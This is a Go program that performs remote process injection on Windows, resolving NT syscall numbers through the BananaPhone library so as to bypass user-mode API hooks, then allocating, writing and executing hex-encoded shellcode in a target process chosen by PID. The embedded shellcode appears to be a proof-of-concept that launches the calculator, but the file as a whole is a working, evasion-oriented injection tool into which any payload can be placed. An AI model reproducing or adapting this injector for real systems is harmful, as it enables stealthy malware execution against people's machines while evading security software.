package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"unsafe"

	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
	"golang.org/x/sys/windows"
)

type clientId struct {
	UniqueProcess uintptr
	UniqueThread  uintptr
}

type objectAttrs struct {
	Length                   uintptr
	RootDirectory            uintptr
	ObjectName               uintptr
	Attributes               uintptr
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

func setup(pid int) (uint16, uint16, uint16, uint16, uint16, uint16, int) {

	bp, err := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	if err != nil {
		log.Fatal(err)
	}
	openProcId, err := bp.GetSysID("NtOpenProcess")
	if err != nil {
		log.Fatal(err)
	}
	createThreadId, err := bp.GetSysID("NtCreateThreadEx")
	if err != nil {
		log.Fatal(err)
	}
	protectVirtMemId, err := bp.GetSysID("NtProtectVirtualMemory")
	if err != nil {
		log.Fatal(err)
	}
	writeVirtMem, err := bp.GetSysID("NtWriteVirtualMemory")
	if err != nil {
		log.Fatal(err)
	}
	allocateVirtMem, err := bp.GetSysID("NtAllocateVirtualMemory")
	if err != nil {
		log.Fatal(err)
	}
	closeHandle, err := bp.GetSysID("NtClose")
	if err != nil {
		log.Fatal(err)
	}
	return openProcId, createThreadId, protectVirtMemId, writeVirtMem, allocateVirtMem, closeHandle, pid
}

func inject(NtOpenProcess uint16, NtCreateThreadEx uint16, NtProtectVirtualMemory uint16, NtWriteVirtualMemory uint16, NtAllocateVirtualMemory uint16, ntClose uint16, pid int) {
	shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}
	var handle uintptr
	// Thanks to this repo for throwing in an extra param as 0 to the func call. Stack alignment issues?
	// https://github.com/timwhitez/Doge-Process-Injection/blob/main/NtCreateThreadEx/NtCreateThreadEx.go
	ret, err := bananaphone.Syscall(NtOpenProcess,
		uintptr(unsafe.Pointer(&handle)),
		windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
		uintptr(unsafe.Pointer(&objectAttrs{})),
		uintptr(unsafe.Pointer(&clientId{UniqueProcess: uintptr(pid)})),
		0,
	)
	if err != nil {
		fmt.Printf("[-] Failed to open process. Return code is %x\n", ret)
		log.Fatal(err)
	}
	var bAddr uintptr
	var regionSize = uintptr(len(shellcode))
	ret, err = bananaphone.Syscall(NtAllocateVirtualMemory,
		handle,
		uintptr(unsafe.Pointer(&bAddr)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		log.Fatalf("[-] Failed to allocate memory. Return code is %x\n", ret)
		return
	}
	var numberBytesWritten uintptr
	// Again credit to this guy and his extra param of 0
	// https://github.com/timwhitez/Doge-Process-Injection/blob/main/NtCreateThreadEx/NtCreateThreadEx.go
	ret, err = bananaphone.Syscall(NtWriteVirtualMemory,
		handle,
		bAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		regionSize,
		uintptr(unsafe.Pointer(&numberBytesWritten)),
		0,
	)

	if err != nil {
		log.Fatalf("[-] Failed to write memory. Return code is %x\n", ret)
	}

	var oldProtect uintptr
	// change protection to execute
	ret, err = bananaphone.Syscall(NtProtectVirtualMemory,
		handle,
		uintptr(unsafe.Pointer(&bAddr)),
		uintptr(unsafe.Pointer(&regionSize)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if err != nil {
		fmt.Printf("[-] Failed to protect Memory. Return code is %x\n", ret)
		return
	}
	var threadHandle uintptr
	ret, err = bananaphone.Syscall(NtCreateThreadEx,
		uintptr(unsafe.Pointer(&threadHandle)),
		0x1FFFFF,
		0,
		handle,
		bAddr,
		0,
		uintptr(0),
		0,
		0,
		0,
		0,
	)
	if err != nil {
		fmt.Printf("[-] Failed to create thread. Return code is %x\n", ret)
		return
	}
	// issues with ntClose
	errCloseHandle := windows.CloseHandle(windows.Handle(handle))
	if errCloseHandle != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
	}

	if err != nil {
		fmt.Printf("[-] Failed to close handle. Return code is %x\n", ret)
		return
	}
}

func main() {
	pPid := flag.Int("pid", 0, "PID of process to inject to")
	flag.Parse()
	if *pPid == 0 {
		log.Fatal("[-] Use the -pid flag to set the pid of a process for injecting")
	}
	inject(setup(*pPid))
}
